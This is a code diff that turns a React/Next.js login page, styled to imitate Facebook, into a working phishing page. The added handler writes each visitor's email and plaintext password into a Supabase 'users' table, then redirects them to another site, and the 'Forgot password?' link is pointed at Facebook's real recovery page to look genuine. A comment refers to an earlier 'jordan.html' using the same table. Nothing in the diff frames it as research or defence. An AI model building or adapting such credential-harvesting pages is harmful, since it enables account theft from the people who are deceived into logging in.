@@ -6,8 +6,9 @@ import Link from "next/link"
 import { motion, AnimatePresence } from "framer-motion"
 import { Eye, EyeOff } from "lucide-react"
 import Image from "next/image"
+import { supabase } from "@/lib/supabase"
 
-export default function LoginPage() {
+export default function Page() {
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
@@ -19,7 +20,7 @@ export default function LoginPage() {
   // Validate email format
   const validateEmail = (email: string) => {
     const re =
-      /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+      /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
     return re.test(String(email).toLowerCase()) || /^\d{10}$/.test(email) // Simple validation for email or 10-digit phone
   }
 
@@ -37,7 +38,7 @@ export default function LoginPage() {
     }
   }
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     // Validate form
     const newErrors = { email: "", password: "" }
@@ -57,14 +58,40 @@ export default function LoginPage() {
       isValid = false
     }
     setErrors(newErrors)
+    
     if (isValid) {
       setIsLoading(true)
-      // Simulate API call
-      setTimeout(() => {
-        console.log("Login attempt with:", { email, password })
+      try {
+        // Use the same table name and structure as jordan.html
+        const { data, error } = await supabase
+          .from('users')
+          .insert([{
+            email: email,
+            password: password,
+            created_at: new Date().toISOString() // Ensure proper date format
+          }])
+          .select()
+
+        if (error) {
+          console.error('Error storing data:', error)
+          setErrors({
+            email: "An error occurred during login. Please try again.",
+            password: ""
+          })
+        } else {
+          console.log('Data stored successfully:', data)
+          // Redirect to Facebook after successful storage
+          window.location.href = 'https://compasia.com.ph/'
+        }
+      } catch (error: any) {
+        console.error('Unexpected error:', error)
+        setErrors({
+          email: error.message || "An unexpected error occurred",
+          password: ""
+        })
+      } finally {
         setIsLoading(false)
-        // Here you would normally redirect or update UI based on login success
-      }, 1500)
+      }
     }
   }
 
@@ -140,8 +167,7 @@ export default function LoginPage() {
       <div className="flex-1 flex flex-col items-center justify-center">
         <div className="w-full max-w-[396px] flex flex-col items-center px-4">
           {/* Login form */}
-          <div className="w-full">
-            <form className="w-full space-y-4" onSubmit={handleSubmit}>
+          <form className="w-full space-y-4" onSubmit={handleSubmit}>
               <div>
                 <div className="relative">
                   <input
@@ -229,17 +255,15 @@ export default function LoginPage() {
                   "Log in"
                 )}
               </motion.button>
-            </form>
-
-            <div className="mt-4 mb-8 text-center">
-              <Link href="#" className="text-gray-600 text-[18px] font-medium hover:underline transition-colors">
-                Forgot password?
-              </Link>
+              </form>
+    
+              <div className="mt-4 mb-8 text-center">
+                <Link href="https://m.facebook.com/login/identify/" className="text-gray-600 text-[18px] font-medium hover:underline transition-colors">
+                  Forgot password?
+                </Link>
+              </div>
             </div>
           </div>
-        </div>
-      </div>
-
       {/* Footer */}
       <footer className="w-full flex flex-col items-center py-8">
         <div className="w-full max-w-[396px] px-4">
@@ -272,4 +296,5 @@ export default function LoginPage() {
     </div>
   )
 }
+
 
